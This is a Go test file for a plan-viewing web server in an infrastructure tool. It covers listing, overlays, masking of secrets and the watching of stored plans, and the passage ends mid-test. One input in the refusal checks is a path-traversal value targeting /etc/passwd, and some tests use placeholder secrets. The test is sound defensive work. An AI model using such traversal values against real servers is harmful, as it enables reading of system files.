package serve

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/pravo-systems/pravo/internal/config"
	"github.com/pravo-systems/pravo/internal/engine"
	"github.com/pravo-systems/pravo/internal/fakes3"
	"github.com/pravo-systems/pravo/internal/state"
)

// stored describes a plan to put in the state of a test project.
type stored struct {
	Author, Reason, Command, Git string
	// Created is when the plan was made, now if zero. It lives for TTL, a week if
	// zero.
	Created time.Time
	TTL     time.Duration
	// Addrs are the changes of writePlan's plan that this one keeps, all if empty.
	Addrs []string
	// Dup lists a change of the summary twice more, as a summary may.
	Dup string
	// Needs is what the changes of the summary need (PlanMeta.Needs). A plan whose
	// summary has none is judged as a whole when the state moves on; one that has
	// them, even an empty map, is judged change by change.
	Needs map[string][]string
}

// storePlan stores a plan in the state the way "pravo plan --store" does: the
// plan file, then its summary. The plan is the one writePlan makes, cut down to
// the addresses, made by the author.
func storePlan(t *testing.T, p *project, o stored) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "plan.pravo")
	writePlan(t, p, path)
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var doc map[string]any
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatal(err)
	}
	if o.Created.IsZero() {
		o.Created = time.Now()
	}
	o.Created = o.Created.UTC()
	if o.TTL == 0 {
		o.TTL = engine.DefaultPlanTTL
	}
	if len(o.Addrs) > 0 {
		keep := map[string]bool{}
		for _, a := range o.Addrs {
			keep[a] = true
		}
		var changes []any
		for _, c := range doc["changes"].([]any) {
			if keep[c.(map[string]any)["addr"].(string)] {
				changes = append(changes, c)
			}
		}
		doc["changes"] = changes
	}
	doc["created"], doc["actor"] = o.Created, o.Author
	if o.Reason != "" {
		doc["reason"] = o.Reason
	}
	if o.Git != "" {
		doc["git_revision"] = o.Git
	}
	data, err := json.MarshalIndent(doc, "", " ")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	pf, err := engine.ReadPlanFile(path)
	if err != nil {
		t.Fatal(err)
	}
	meta := &engine.PlanMeta{Format: engine.PlanMetaFormat, Created: o.Created, Expires: o.Created.Add(o.TTL), Author: o.Author, Actor: o.Author,
		Reason: o.Reason, Command: o.Command, GitRevision: o.Git, Lineage: pf.Lineage, Fingerprint: pf.ConfigFingerprint,
		Bases: map[string]engine.PlanBase{}, Changes: []engine.PlanTouch{}, Needs: o.Needs}
	for _, sc := range pf.Changes {
		switch sc.Action {
		case engine.ActionCreate:
			meta.Summary.Add++
		case engine.ActionUpdate:
			meta.Summary.Change++
		case engine.ActionDelete:
			meta.Summary.Destroy++
		case engine.ActionReplace:
			meta.Summary.Add++
			meta.Summary.Destroy++
		}
		meta.Changes = append(meta.Changes, engine.PlanTouch{Addr: sc.Addr, Mode: sc.Mode, Type: sc.Type, Action: sc.Action})
		meta.Bases[sc.Addr] = engine.PlanBase{Revision: sc.PriorRevision, Generation: sc.PriorGeneration}
	}
	if o.Dup != "" {
		for _, c := range append([]engine.PlanTouch(nil), meta.Changes...) {
			if c.Addr == o.Dup {
				meta.Changes = append(meta.Changes, c, c)
			}
		}
	}
	sort.Slice(meta.Changes, func(i, j int) bool { return meta.Changes[i].Addr < meta.Changes[j].Addr })
	ps := engine.NewPlanStore(p.store.Backend())
	if err := ps.Put(context.Background(), data, meta); err != nil {
		t.Fatal(err)
	}
	return meta.ID
}

func (p *project) plans() PlanList {
	p.t.Helper()
	var l PlanList
	if err := json.Unmarshal(p.get("/api/plans"), &l); err != nil {
		p.t.Fatal(err)
	}
	return l
}

func (p *project) overlay(id string) PlanOverlay {
	p.t.Helper()
	var o PlanOverlay
	if err := json.Unmarshal(p.get("/api/plan?id="+queryEscape(id)), &o); err != nil {
		p.t.Fatal(err)
	}
	return o
}

func planOf(l PlanList, id string) *StoredPlan {
	for i := range l.Plans {
		if l.Plans[i].ID == id {
			return &l.Plans[i]
		}
	}
	return nil
}

func ids(l PlanList) []string {
	var out []string
	for _, sp := range l.Plans {
		out = append(out, sp.ID)
	}
	return out
}

func same(a, b []string) bool { return strings.Join(a, " ") == strings.Join(b, " ") }

// newestFirst makes the plans of the tests: two that are pending and overlap, one
// that the state moved on from, one applied and one expired.
type fiveStored struct{ ana, ben, ci, eve, dee string }

func storeFive(t *testing.T, p *project) fiveStored {
	t.Helper()
	now := time.Now()
	f := fiveStored{
		ana: storePlan(t, p, stored{Author: "ana@acme", Reason: "raise the port", Git: "9f3c2ab", Created: now.Add(-3 * time.Hour),
			Command: "pravo plan --store -t db_password=" + secretToken, Addrs: []string{"services.a.db", "services.b.file"}}),
		ben: storePlan(t, p, stored{Author: "ben@acme", Created: now.Add(-2 * time.Hour), Addrs: []string{"services.a.db", "hosts.x"}}),
		ci:  storePlan(t, p, stored{Author: "ci@acme", Created: now.Add(-1 * time.Hour), Addrs: []string{"old.thing"}}),
		eve: storePlan(t, p, stored{Author: "eve@acme", Created: now.Add(-26 * time.Hour), Addrs: []string{"hosts.x"}}),
		dee: storePlan(t, p, stored{Author: "dee@acme", Created: now.Add(-9 * 24 * time.Hour), Addrs: []string{"services.b.file"}}),
	}
	ps := engine.NewPlanStore(p.store.Backend())
	if err := ps.MarkApplied(context.Background(), f.eve, []string{"hosts.x"}, "txn-eve", []string{"hosts.x"}); err != nil {
		t.Fatal(err)
	}
	// The state moves on from what the plan of ci expected.
	r := *p.store.Get("old.thing")
	if err := p.store.Set(&r, ""); err != nil {
		t.Fatal(err)
	}
	return f
}

// The listing: every status, newest first, with what a reader needs to choose a
// plan and the exact command that applies it; and the graph carries, on each
// node, the plans that can still be applied and change it.
func TestStoredPlansAreListed(t *testing.T) {
	p := newProject(t)
	f := storeFive(t, p)
	waitFor(t, "the stored plans", func() bool { return len(p.plans().Plans) == 5 && planOf(p.plans(), f.ci).Status == "stale" })
	l := p.plans()
	g := p.graph()
	if l.Version != APIVersion || l.Revision != g.Revision {
		t.Errorf("the list has version %d and revision %s, the graph %s", l.Version, l.Revision, g.Revision)
	}
	if want := []string{f.ci, f.ben, f.ana, f.eve, f.dee}; !same(ids(l), want) {
		t.Errorf("the plans are listed %v, want %v (newest first)", ids(l), want)
	}
	for id, want := range map[string]string{f.ana: "pending", f.ben: "pending", f.ci: "stale", f.eve: "applied", f.dee: "expired"} {
		if sp := planOf(l, id); sp.Status != want || sp.Open != (want == "pending") {
			t.Errorf("%s is %q (open %v), want %q", id, sp.Status, sp.Open, want)
		}
	}
	ana := planOf(l, f.ana)
	if ana.Author != "ana@acme" || ana.Apply != "pravo apply "+f.ana {
		t.Errorf("ana's plan: %+v", ana)
	}
	// What the author wrote with the plan is not in the listing, but in the overlay.
	for _, text := range []string{"raise the port", "9f3c2ab", "pravo plan --store"} {
		if strings.Contains(string(p.get("/api/plans")), text) {
			t.Errorf("the listing carries %q, which the author wrote with the plan", text)
		}
	}
	if o := p.overlay(f.ana); o.Reason != "raise the port" || o.GitRevision != "9f3c2ab" || !strings.Contains(o.Command, "pravo plan --store") {
		t.Errorf("overlay text: %q %q %q", o.Reason, o.GitRevision, o.Command)
	}
	if ana.Summary != (PlanCounts{Add: 1, Change: 1}) || ana.Planned != 2 || ana.Applied != 0 || ana.Applying || ana.Destroy {
		t.Errorf("ana's counts: %+v planned %d", ana.Summary, ana.Planned)
	}
	if want := []PlanChange{{Addr: "services.a.db", Action: "update"}, {Addr: "services.b.file", Action: "create"}}; len(ana.Touches) != 2 || ana.Touches[0] != want[0] || ana.Touches[1] != want[1] {
		t.Errorf("ana touches %v, want %v", ana.Touches, want)
	}
	if !ana.Created.Before(time.Now().Add(-2*time.Hour)) || ana.Expires.Sub(ana.Created) != engine.DefaultPlanTTL {
		t.Errorf("created %s expires %s", ana.Created, ana.Expires)
	}
	if len(ana.Overlaps) != 1 || ana.Overlaps[0].ID != f.ben || ana.Overlaps[0].Count != 1 || !same(ana.Overlaps[0].Addrs, []string{"services.a.db"}) {
		t.Errorf("ana overlaps %+v, want ben on services.a.db", ana.Overlaps)
	}
	// The relation is symmetric.
	if ben := planOf(l, f.ben); len(ben.Overlaps) != 1 || ben.Overlaps[0].ID != f.ana || !same(ben.Overlaps[0].Addrs, []string{"services.a.db"}) {
		t.Errorf("ben overlaps %+v, want ana on services.a.db", ben.Overlaps)
	}
	if ci := planOf(l, f.ci); len(ci.Reasons) != 1 || !strings.Contains(ci.Reasons[0], "old.thing changed in state") || len(ci.Overlaps) != 0 {
		t.Errorf("ci: reasons %v overlaps %v", ci.Reasons, ci.Overlaps)
	}
	if eve := planOf(l, f.eve); eve.Applied != 1 || len(eve.Overlaps) != 0 {
		t.Errorf("eve: applied %d overlaps %v", eve.Applied, eve.Overlaps)
	}
	if dee := planOf(l, f.dee); dee.Open || len(dee.Overlaps) != 0 || len(dee.Reasons) != 0 {
		t.Errorf("dee: %+v", dee)
	}
	// What a person wrote, and a recorded command line, are masked as the history is.
	raw := p.get("/api/plans")
	noSecrets(t, "the list of plans", raw)
	if o := p.overlay(f.ana); strings.Contains(o.Command, secretToken) {
		t.Errorf("the command of ana's plan sends the value of -t: %s", o.Command)
	}

	// The plans that can be applied are on the nodes they change; two of them on one node overlap.
	for addr, want := range map[string][]string{"services.a.db": {f.ben, f.ana}, "services.b.file": {f.ana}, "hosts.x": {f.ben}, "old.thing": nil, "shared": nil} {
		n := nodeOf(g, addr)
		if !same(n.Plans, want) || n.Overlap != (len(want) > 1) {
			t.Errorf("%s: plans %v overlap %v, want %v", addr, n.Plans, n.Overlap, want)
		}
	}
	// A reader that does not know the new fields reads the rest as before.
	var old struct {
		Nodes []struct{ Addr, Action string }
		Plan  *PlanInfo
	}
	if err := json.Unmarshal(p.get("/api/graph"), &old); err != nil || len(old.Nodes) != 8 || old.Plan != nil {
		t.Errorf("the graph for an old reader: %d nodes, plan %v, %v", len(old.Nodes), old.Plan, err)
	}
}

// A stored plan is laid over the graph as a plan file is: the actions of its
// nodes, and the attribute changes in the detail of a node, which the request
// asks for by the id.
func TestStoredPlanOverlay(t *testing.T) {
	p := newProject(t)
	f := storeFive(t, p)
	waitFor(t, "the stored plans", func() bool { return len(p.plans().Plans) == 5 })

	o := p.overlay(f.ana)
	if o.Version != APIVersion || o.Revision != p.graph().Revision {
		t.Errorf("version %d revision %s", o.Version, o.Revision)
	}
	pl := o.Plan
	if pl.ID != f.ana || pl.File != f.ana || pl.Actor != "ana@acme" || pl.Status != "pending" || pl.Stale || len(pl.Reasons) != 0 {
		t.Errorf("plan %+v", pl)
	}
	if pl.Summary.Add != 1 || pl.Summary.Change != 1 || pl.Summary.Destroy != 0 || pl.Planned != 2 || pl.Total != 8 {
		t.Errorf("summary %+v planned %d of %d", pl.Summary, pl.Planned, pl.Total)
	}
	// services.a.db and what depends on it (its file and shared), and the new file.
	if pl.Summary.BlastRadius != 4 {
		t.Errorf("blast radius %d, want 4", pl.Summary.BlastRadius)
	}
	acts := map[string]string{}
	for _, n := range o.Nodes {
		acts[n.Addr] = n.Action
	}
	if len(acts) != 2 || acts["services.a.db"] != "update" || acts["services.b.file"] != "create" {
		t.Errorf("actions %v", acts)
	}
	// The graph itself shows no plan: nothing was started with --plan.
	if g := p.graph(); g.Plan != nil || nodeOf(g, "services.a.db").Action != "" {
		t.Errorf("the graph shows a plan: %+v", g.Plan)
	}

	// The detail of a node for the plan: its action and its attribute changes, values withheld as for a plan file.
	secrets := append(allSecrets, "new-blob-value-9999", "new-map-secret-5555", "new-nested-key-6666", "new-pin-value-7777")
	raw := p.get("/api/detail?addr=services.a.db&plan=" + f.ana)
	noSecrets(t, "the detail for a stored plan", raw, secrets...)
	var d Detail
	if err := json.Unmarshal(raw, &d); err != nil {
		t.Fatal(err)
	}
	if d.Node.Action != "update" || d.Change == nil || d.Change.Action != "update" || len(d.Change.Attrs) == 0 {
		t.Fatalf("detail for the plan: action %q change %+v", d.Node.Action, d.Change)
	}
	changes := map[string]AttrChange{}
	for _, a := range d.Change.Attrs {
		changes[a.Path] = a
	}
	for _, path := range []string{"blob", "tags.db_password", "settings.key", "rule[0].pin"} {
		if a := changes[path]; !a.BeforeRedacted || !a.AfterRedacted || a.Before != nil || a.After != nil {
			t.Errorf("%s: %+v, want both sides withheld", path, a)
		}
	}
	if a := changes["port"]; a.Before != float64(5432) || a.After != float64(6543) {
		t.Errorf("port: %+v", a)
	}
	// Without plan= the node has no change, and for a plan that does not run it, none either.
	if d := p.detail("services.a.db"); d.Change != nil || d.Node.Action != "" {
		t.Errorf("the detail without a plan: %+v %q", d.Change, d.Node.Action)
	}
	var other Detail
	if err := json.Unmarshal(p.get("/api/detail?addr=old.thing&plan="+f.ana), &other); err != nil || other.Change != nil || other.Node.Action != "" {
		t.Errorf("a node that the plan does not run: %+v %q %v", other.Change, other.Node.Action, err)
	}
	// A plan that creates a node shows what it writes and nothing before.
	var created Detail
	if err := json.Unmarshal(p.get("/api/detail?addr=services.b.file&plan="+f.ana), &created); err != nil || created.Change == nil || created.Change.Action != "create" || len(created.Change.Attrs) != 2 {
		t.Errorf("create: %+v %v", created.Change, err)
	}
	// The lines that the plan changes are marked in the source, and a literal stays masked.
	var s Source
	rawSrc := p.get("/api/source?addr=services.a.db&plan=" + f.ana)
	noSecrets(t, "the source for a stored plan", rawSrc, secrets...)
	if err := json.Unmarshal(rawSrc, &s); err != nil {
		t.Fatal(err)
	}
	marked := map[string]string{}
	for _, l := range s.Blocks[0].Lines {
		marked[strings.TrimSpace(strings.SplitN(strings.TrimSpace(l.Text), ":", 2)[0])] = l.Mark
	}
	if marked["port"] != "changed" || marked["blob"] != "sensitive" {
		t.Errorf("marks %v", marked)
	}
	noSecrets(t, "the overlay", p.get("/api/plan?id="+f.ana), secrets...)
	noSecrets(t, "the list", p.get("/api/plans"), secrets...)

	// A plan that is applied or expired is laid over the graph all the same, to be looked at.
	if o := p.overlay(f.eve); o.Plan.Status != "applied" || len(o.Nodes) != 1 || !o.Nodes[0].Applied {
		t.Errorf("applied plan: %+v %+v", o.Plan, o.Nodes)
	}
	if o := p.overlay(f.dee); o.Plan.Status != "expired" || o.Plan.Stale {
		t.Errorf("expired plan: %+v", o.Plan)
	}
	if o := p.overlay(f.ci); o.Plan.Status != "stale" || !o.Plan.Stale || len(o.Plan.Reasons) != 1 || len(o.Warnings) != 1 || !strings.Contains(o.Warnings[0], "stale") {
		t.Errorf("stale plan: %+v %v", o.Plan, o.Warnings)
	}

	// What is not a stored plan is refused, and a prefix is not taken for the id.
	for path, want := range map[string]int{
		"/api/plan":                                         400,
		"/api/plan?id=":                                     400,
		"/api/plan?id=services.a.db":                        400,
		"/api/plan?id=../../etc/passwd":                     400,
		"/api/plan?id=plan-ffffffff":                        404,
		"/api/plan?id=" + f.ana[:len(f.ana)-1]:              404,
		"/api/detail?addr=services.a.db&plan=":              400,
		"/api/detail?addr=services.a.db&plan=nope":          400,
		"/api/detail?addr=services.a.db&plan=plan-ffffffff": 404,
		"/api/source?addr=services.a.db&plan=plan-ffffffff": 404,
	} {
		if resp, _ := p.do("GET", path, nil); resp.StatusCode != want {
			t.Errorf("GET %s: %d, want %d", path, resp.StatusCode, want)
		}
	}
	if resp, _ := p.do("POST", "/api/plans", nil); resp.StatusCode != 405 {
		t.Errorf("POST /api/plans: %d", resp.StatusCode)
	}
}

// Without the cached schemas the values of a stored plan are not shown, and the
// actions still are, as for a plan file.
func TestStoredPlanWithoutSchemas(t *testing.T) {
	dir := t.TempDir()
	writeSpec(t, dir, specCUE)
	st, _ := state.Open(filepath.Join(dir, "pravo.state"))
	seed(t, st)
	holder := &project{t: t, dir: dir, store: st}
	id := storePlan(t, holder, stored{Author: "ana@acme"})
	p := start(t, dir, st, Options{Schemas: fakeLookupNone})
	o := p.overlay(id)
	if len(o.Warnings) != 1 || !strings.Contains(o.Warnings[0], "values of the plan are not shown") || o.Plan.Summary.Add != 2 || o.Plan.Summary.Destroy != 1 {
		t.Errorf("overlay %+v warnings %v", o.Plan, o.Warnings)
	}
	var d Detail
	raw := p.get("/api/detail?addr=services.a.db&plan=" + id)
	noSecrets(t, "detail", raw)
	if err := json.Unmarshal(raw, &d); err != nil || d.Change == nil || d.Change.Action != "update" || len(d.Change.Attrs) != 0 {
		t.Errorf("change %+v %v", d.Change, err)
	}
}

// A stored plan that mentions a secret of the state in the text a person wrote is
// masked, and so is a command line that carries a value.
func TestStoredPlanTextIsMasked(t *testing.T) {
	p := newProject(t)
	id := storePlan(t, p, stored{Author: "ana@acme", Reason: "rotate " + secretBlob, Git: "main", Command: "pravo plan --store -t password=hunter2hunter2 --api_token " + secretToken})
	waitFor(t, "the plan", func() bool { return len(p.plans().Plans) == 1 })
	o := p.overlay(id)
	if strings.Contains(o.Reason, secretBlob) || !strings.Contains(o.Reason, "rotate") {
		t.Errorf("reason %q", o.Reason)
	}
	if strings.Contains(o.Command, "hunter2") || strings.Contains(o.Command, secretToken) || !strings.Contains(o.Command, "pravo plan --store") {
		t.Errorf("command %q", o.Command)
	}
	noSecrets(t, "list", p.get("/api/plans"), append(allSecrets, "hunter2hunter2")...)
	noSecrets(t, "overlay", p.get("/api/plan?id="+id), append(allSecrets, "hunter2hunter2")...)
}

// pravo serve --plan ID: the stored plan is the plan of the graph, as a plan file
// would be, and the others stay listed.
func TestServeAStoredPlan(t *testing.T) {
	dir := t.TempDir()
	writeSpec(t, dir, specCUE)
	st, _ := state.Open(filepath.Join(dir, "pravo.state"))
	seed(t, st)
	holder := &project{t: t, dir: dir, store: st}
	ana := storePlan(t, holder, stored{Author: "ana@acme", Created: time.Now().Add(-time.Hour), Addrs: []string{"services.a.db", "services.b.file"}})
	ben := storePlan(t, holder, stored{Author: "ben@acme", Addrs: []string{"services.a.db", "hosts.x"}})
	// The beginning of an id is enough, as for the other commands.
	p := start(t, dir, st, Options{PlanID: ana[:len("plan-")+6]})
	g := p.graph()
	if g.Plan == nil || g.Plan.ID != ana || g.Plan.File != ana || g.Plan.Actor != "ana@acme" || g.Plan.Status != "pending" || g.Plan.Summary.Add != 1 || g.Plan.Summary.Change != 1 {
		t.Fatalf("plan %+v", g.Plan)
	}
	for addr, want := range map[string]string{"services.a.db": "update", "services.b.file": "create", "hosts.x": "", "old.thing": ""} {
		if n := nodeOf(g, addr); n.Action != want {
			t.Errorf("%s: action %q, want %q", addr, n.Action, want)
		}
	}
	// The graph's own plan is a stored plan: its detail needs no plan=, and asking for it by id says the same.
	secrets := append(allSecrets, "new-blob-value-9999", "new-map-secret-5555")
	raw := p.get("/api/detail?addr=services.a.db")
	noSecrets(t, "detail", raw, secrets...)
	var d, dn Detail
	json.Unmarshal(raw, &d)
	json.Unmarshal(p.get("/api/detail?addr=services.a.db&plan="+ana), &dn)
	if d.Change == nil || d.Change.Action != "update" || len(d.Change.Attrs) == 0 || dn.Change == nil || len(dn.Change.Attrs) != len(d.Change.Attrs) {
		t.Errorf("change %+v / %+v", d.Change, dn.Change)
	}
	// plan=none asks for no plan: the page that was shown the plan and then let go of it.
	var none Detail
	if err := json.Unmarshal(p.get("/api/detail?addr=services.a.db&plan=none"), &none); err != nil || none.Change != nil || none.Node.Action != "" {
		t.Errorf("plan=none: change %+v action %q %v", none.Change, none.Node.Action, err)
	}
	// Another plan is laid over the graph by id, and the graph keeps its own.
	if o := p.overlay(ben); o.Plan.ID != ben || len(o.Nodes) != 2 {
		t.Errorf("overlay of ben: %+v", o)
	}
	if l := p.plans(); len(l.Plans) != 2 || l.Plans[0].ID != ben {
		t.Errorf("list %v", ids(l))
	}
	noSecrets(t, "graph", p.get("/api/graph"), secrets...)
}

func TestServeAStoredPlanThatIsNotThere(t *testing.T) {
	dir := t.TempDir()
	writeSpec(t, dir, specCUE)
	st, _ := state.Open(filepath.Join(dir, "pravo.state"))
	seed(t, st)
	holder := &project{t: t, dir: dir, store: st}
	storePlan(t, holder, stored{Author: "ana@acme"})
	for _, id := range []string{"plan-ffffff", "plan-ff"} {
		_, err := New(Options{Dir: dir, PlanID: id, Schemas: fakeLookup})
		if err == nil || !strings.Contains(err.Error(), "no such stored plan") && !strings.Contains(err.Error(), "not the id") {
			t.Errorf("--plan %s: %v", id, err)
		}
	}
	if _, err := New(Options{Dir: dir, PlanID: "plan-ffffff", PlanFile: filepath.Join(dir, "x.pravo")}); err == nil {
		t.Error("a plan file and a stored plan: no error")
	}
	// Two plans whose ids begin alike are not guessed between.
	src := storePlan(t, holder, stored{Author: "ben@acme"})
	for _, id := range []string{"plan-aaaaaaa1", "plan-aaaaaaa2"} {
		for _, kind := range []string{".plan.json", ".meta.json"} {
			data, err := st.Backend().Get(context.Background(), "plans/"+src+kind)
			if err != nil {
				t.Fatal(err)
			}
			if kind == ".meta.json" {
				data = []byte(strings.Replace(string(data), src, id, 1))
			}
			if _, err := st.Backend().PutIfAbsent(context.Background(), "plans/"+id+kind, data); err != nil {
				t.Fatal(err)
			}
		}
	}
	if _, err := New(Options{Dir: dir, PlanID: "plan-aaaaaa", Schemas: fakeLookup}); err == nil || !strings.Contains(err.Error(), "fits 2 stored plans") {
		t.Errorf("an ambiguous id: %v", err)
	}
	if _, err := New(Options{Dir: dir, PlanID: "plan-aaaaaaa2", Schemas: fakeLookup}); err != nil {
		t.Errorf("a whole id: %v", err)
	}
}

// eventsOf reads the events of /api/events.
func eventsOf(t *testing.T, p *project) func(within time.Duration) (Event, bool) {
	t.Helper()
	req, _ := http.NewRequest("GET", p.base+"/api/events", nil)
	req.Header.Set("Authorization", "Bearer "+p.srv.Token())
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { resp.Body.Close() })
	events := make(chan Event, 100)
	go func() {
		sc := bufio.NewScanner(resp.Body)
		for sc.Scan() {
			if data, ok := strings.CutPrefix(sc.Text(), "data: "); ok {
				var ev Event
				if json.Unmarshal([]byte(data), &ev) == nil {
					events <- ev
				}
			}
		}
		close(events)
	}()
	<-events // the first, with the revision the server holds
	return func(within time.Duration) (Event, bool) {
		select {
		case ev, ok := <-events:
			return ev, ok
		case <-time.After(within):
			return Event{}, false
		}
	}
}

// A plan that appears, changes and goes shows up in the open page: the server
// sends an event that says "plans" and the graph and the list have the new
// revision.
func TestStoredPlansAreWatched(t *testing.T) {
	p := newProject(t)
	next := eventsOf(t, p)
	// expect makes the change, waits for an event that says "plans" (and not
	// "state", which nothing here writes), and then for the list to show it: a plan
	// is written in two steps, and a poll may fall between them.
	expect := func(what string, change func(), shows func(PlanList) bool) PlanList {
		t.Helper()
		change()
		for told := false; !told; {
			ev, ok := next(10 * time.Second)
			if !ok {
				t.Fatalf("%s: no event for the plans", what)
			}
			if contains(ev.What, "state") || contains(ev.What, "spec") || contains(ev.What, "locks") {
				t.Errorf("%s: the event says %v", what, ev.What)
			}
			told = contains(ev.What, "plans")
		}
		waitFor(t, what, func() bool { return shows(p.plans()) })
		return p.plans()
	}
	var id string
	l := expect("a plan appears", func() {
		id = storePlan(t, p, stored{Author: "ana@acme", Addrs: []string{"services.a.db", "services.b.file"}})
	},
		func(l PlanList) bool { return len(l.Plans) == 1 })
	if sp := planOf(l, id); sp == nil || sp.Status != "pending" {
		t.Fatalf("after the plan was stored: %v", ids(l))
	}
	waitFor(t, "the node", func() bool { return same(nodeOf(p.graph(), "services.a.db").Plans, []string{id}) })
	if n := nodeOf(p.graph(), "services.a.db"); n.Overlap {
		t.Errorf("one plan overlaps: %v", n.Plans)
	}
	// The progress object keeps its key and is replaced: that is a change too.
	ps := engine.NewPlanStore(p.store.Backend())
	l = expect("a change is applied from the plan", func() {
		if err := ps.MarkApplied(context.Background(), id, []string{"services.b.file"}, "txn-1", []string{"left"}); err != nil {
			t.Fatal(err)
		}
	}, func(l PlanList) bool { return planOf(l, id).Status == "partial" })
	if sp := planOf(l, id); sp.Applied != 1 || !sp.Open {
		t.Errorf("after a change was applied: %+v", sp)
	}
	l = expect("the rest is applied", func() {
		if err := ps.MarkApplied(context.Background(), id, []string{"services.a.db"}, "txn-2", []string{"services.a.db"}); err != nil {
			t.Fatal(err)
		}
	}, func(l PlanList) bool { return planOf(l, id).Status == "applied" })
	if sp := planOf(l, id); sp.Applied != 2 {
		t.Errorf("after the rest was applied: %+v", sp)
	}
	waitFor(t, "the node", func() bool { return len(nodeOf(p.graph(), "services.a.db").Plans) == 0 })
	// The plan is collected: the three objects go.
	l = expect("the plan is collected", func() {
		for _, suffix := range []string{".progress.json", ".meta.json", ".plan.json"} {
			if err := p.store.Backend().Delete(context.Background(), "plans/"+id+suffix); err != nil {
				t.Fatal(err)
			}
		}
	}, func(l PlanList) bool { return len(l.Plans) == 0 })
	if resp, _ := p.do("GET", "/api/plan?id="+id, nil); resp.StatusCode != 404 {
		t.Errorf("a plan that was collected: %d", resp.StatusCode)
	}
}

// A plan that is not applied expires without anything being written: the watcher
// counts the moment as a change of the plans, once.
func TestAnExpiringPlanIsNoticed(t *testing.T) {
	p := newProject(t)
	id := storePlan(t, p, stored{Author: "ana@acme", Created: time.Now().Add(-time.Hour), TTL: time.Hour + 3*time.Second, Addrs: []string{"services.b.file"}})
	waitFor(t, "the plan", func() bool { sp := planOf(p.plans(), id); return sp != nil && sp.Status == "pending" })
	if n := nodeOf(p.graph(), "services.b.file"); !same(n.Plans, []string{id}) {
		t.Fatalf("the node: %v", n.Plans)
	}
	next := eventsOf(t, p)
	ev, ok := next(10 * time.Second)
	if !ok || !same(ev.What, []string{"plans"}) {
		t.Fatalf("event %+v %v", ev, ok)
	}
	if sp := planOf(p.plans(), id); sp.Status != "expired" {
		t.Errorf("the plan is %q after its expiry", sp.Status)
	}
	if n := nodeOf(p.graph(), "services.b.file"); len(n.Plans) != 0 {
		t.Errorf("the node: %v", n.Plans)
	}
	if ev, ok := next(400 * time.Millisecond); ok {
		t.Errorf("a second event: %+v", ev)
	}
}

// The watcher of a local state: a plan stored, a progress replaced and a plan
// removed are each one change of the plans and of nothing else, and an unchanged
// directory is quiet.
func TestWatcherSeesStoredPlans(t *testing.T) {
	dir := t.TempDir()
	loc := filepath.Join(dir, "pravo.state")
	st, err := state.Open(loc)
	if err != nil {
		t.Fatal(err)
	}
	w := newWatcher(time.Hour, dir, "")
	w.setState(loc, nil)
	sub, cancel := w.bus.subscribe()
	defer cancel()
	first, _ := w.sample()
	for i := 0; i < 3; i++ {
		if rev, _ := w.sample(); rev != first {
			t.Fatalf("poll %d: the revision moved with nothing written", i)
		}
	}
	expect := func(what string, change func()) {
		t.Helper()
		change()
		before := w.revision()
		w.sample()
		if w.revision() == before {
			t.Fatalf("%s: not seen", what)
		}
		select {
		case ev := <-sub:
			if !same(ev.What, []string{"plans"}) {
				t.Errorf("%s: the event says %v", what, ev.What)
			}
		default:
			t.Fatalf("%s: no event", what)
		}
		seen := w.revision()
		w.sample()
		select {
		case ev := <-sub:
			t.Errorf("%s: a second event %+v", what, ev)
		default:
		}
		if w.revision() != seen {
			t.Errorf("%s: seen twice", what)
		}
	}
	b := st.Backend()
	ctx := context.Background()
	ps := engine.NewPlanStore(b)
	id := "plan-" + strings.Repeat("a", 8)
	expect("a plan is stored", func() {
		b.PutIfAbsent(ctx, "plans/"+id+".plan.json", []byte("{}"))
		b.PutIfAbsent(ctx, "plans/"+id+".meta.json", []byte("{}"))
	})
	expect("progress is made", func() {
		if err := ps.MarkApplied(ctx, id, []string{"a.b"}, "txn-1", []string{"left"}); err != nil {
			t.Fatal(err)
		}
	})
	expect("progress is made again", func() {
		if err := ps.MarkApplied(ctx, id, []string{"a.c"}, "txn-2", []string{"a.c"}); err != nil {
			t.Fatal(err)
		}
	})
	expect("a plan is collected", func() {
		for _, k := range []string{".progress.json", ".meta.json", ".plan.json"} {
			b.Delete(ctx, "plans/"+id+k)
		}
	})
	// The nearest expiry of the open plans counts once it has passed.
	w.setPlanExpiry(time.Now().Add(-time.Second))
	expect("a plan expires", func() {})
	w.setPlanExpiry(time.Now().Add(time.Hour))
	if rev, _ := w.sample(); rev != w.revision() {
		t.Error("an expiry in the future moved the revision")
	}
}

// The plans of a state in a bucket: they are listed and laid over the graph, the
// viewer writes nothing to the bucket, and the progress of a plan, which keeps
// its key when it is replaced, is noticed.
func TestStoredPlansInABucket(t *testing.T) {
	f := fakes3.New()
	var armed atomic.Bool
	var writes atomic.Int32
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if armed.Load() && r.Method != http.MethodGet && r.Method != http.MethodHead {
			writes.Add(1)
		}
		f.ServeHTTP(w, r)
	}))
	t.Cleanup(ts.Close)
	b, err := state.NewS3Backend(context.Background(), state.S3Config{Bucket: "state", Prefix: "team/app", Region: "us-east-1", Endpoint: ts.URL,
		PathStyle: true, AccessKey: "test", SecretKey: "test"})
	if err != nil {
		t.Fatal(err)
	}
	st, err := state.OpenBackend(context.Background(), b)
	if err != nil {
		t.Fatal(err)
	}
	seed(t, st)
	dir := t.TempDir()
	writeSpec(t, dir, specCUE+`
$settings: state: {backend: "s3", bucket: "state", prefix: "team/app", region: "us-east-1", endpoint: "`+ts.URL+`", path_style: true, access_key: "test", secret_key: "test"}
`)
	holder := &project{t: t, dir: dir, store: st}
	ana := storePlan(t, holder, stored{Author: "ana@acme", Addrs: []string{"services.a.db", "services.b.file"}})
	ben := storePlan(t, holder, stored{Author: "ben@acme", Created: time.Now().Add(time.Minute), Addrs: []string{"services.a.db", "hosts.x"}})
	opts := Options{OpenState: func(ctx context.Context, root *config.Root) (*state.Store, error) {
		return state.OpenBackend(ctx, ReadOnly(b))
	}}
	armed.Store(true)
	p := start(t, dir, st, opts)
	l := p.plans()
